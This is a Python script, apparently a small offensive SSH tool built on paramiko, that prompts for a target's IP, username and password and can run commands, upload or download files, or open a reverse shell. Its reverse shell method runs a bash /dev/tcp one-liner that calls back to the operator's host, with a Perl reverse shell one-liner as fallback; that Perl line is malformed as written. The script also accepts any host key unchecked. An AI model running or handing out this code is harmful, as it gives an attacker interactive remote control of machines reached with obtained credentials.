import paramiko
import sys


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    purple = '\033[0;35m'
    green = '\033[0;32m'
    blue = '\033[34m'
    end = '\033[m'


class SSH(object):
    def __init__(self, server, user, password, command, local_host, local_port, your_file, destination, remote_port):
        self.password = password
        self.user = user
        self.server = server
        self.command = command
        self.local_host = local_host
        self.local_port = local_port
        self.your_file = your_file
        self.destination = destination
        self.remote_port = remote_port

    def invoke_remote_command(self):
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(hostname=self.server,
                           username=self.user,
                           password=self.password)
        stdin, stdout, stderr = ssh_client.exec_command(self.command)
        try:
            out = stdout.read().decode().strip()
            ssh_client.close()
            return out
        except IOError:
            print(f"[{Colors.green}COULD NOT CONNECT TO{Colors.end}]: {self.server}<>{self.user}")
        ssh_client.close()

    def invoke_reverse_shell(self):
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(hostname=self.server,
                           username=self.user,
                           password=self.password)
        try:
            stdin, stdout, stderr = ssh_client.exec_command(
                f"bash -i >& /dev/tcp/{self.local_host}/{self.local_port} 0>&1")
        except Exception as e:
            print(e, f"\n[{Colors.red}-]  Trying Perl Windows Reverse Shell")
            stdin, stdout, stderr = ssh_client.exec_command(
                f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr, {self.local_host}:{self.local_port});STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'")
        ssh_client.close()
        try:
            out = stdout.read().decode().strip()
            ssh_client.close()
            return out
        except IOError:
            print(f"[{Colors.green}COULD NOT CONNECT TO{Colors.end}]: {self.server}<>{self.user}")

    def file_transfer_sftp(self):
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(hostname=self.server,
                           username=self.user,
                           password=self.password)
        sftp_client = ssh_client.open_sftp()
        sftp_client.put(self.your_file, self.destination)
        sftp_client.close()
        ssh_client.close()

    def get_file(self):
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        trans = paramiko.Transport(self.server, self.remote_port)
        trans.connect(username=self.user, password=self.password)
        sftp = paramiko.SFTPClient.from_transport(trans)
        sftp.get(self.destination, self.your_file)
        sftp.close()
        trans.close()


ssh_interaction = SSH(server=input(f"{Colors.red}(SSH INTERACTION) {Colors.end}[Enter Ip Address]:~#"),
                      user=input(f"{Colors.red}(SSH INTERACTION) {Colors.end}[Enter Username]:~#"),
                      password=input(f"{Colors.red}(SSH INTERACTION) {Colors.end}[Enter Password]:~#"),
                      your_file=input(f"{Colors.red}(SSH INTERACTION) {Colors.end}[Enter File You Want Upload]:~#"),
                      destination=input(
                          f"{Colors.red}(SSH INTERACTION) {Colors.end}[Enter Directory You Want To Upload To]:~#"),
                      local_port=input(f"{Colors.red}(SSH INTERACTION) {Colors.end}[Enter Local Port]:~#"),
                      local_host=input(f"{Colors.red}(SSH INTERACTION) {Colors.end}[Enter Local Host]:~#"),
                      command=input(f"{Colors.red}(SSH INTERACTION) {Colors.end}[Enter Command]:~#"),
                      remote_port=input(f"{Colors.red}(SSH INTERACTION) {Colors.end}[Enter SSH Port]:~#"))

if __name__ == '__main__':
    if sys.argv[1] == "upload":
        ssh_interaction.file_transfer_sftp()
    elif sys.argv[1] == "download":
        ssh_interaction.get_file()
    elif sys.argv[1] == "reverse shell":
        ssh_interaction.invoke_reverse_shell()
    elif sys.argv[1] == "command":
        ssh_interaction.invoke_remote_command()
    else:
        exit(f"""
usage: python3 {sys.argv[0]} <options>
_______________________________________
    command - invoke a command on the remote machine
    download - download a file on the remote machine
    upload - upload a file to the remote machine
    reverse shell - invoke a reverse shell from the remote machine\n""")
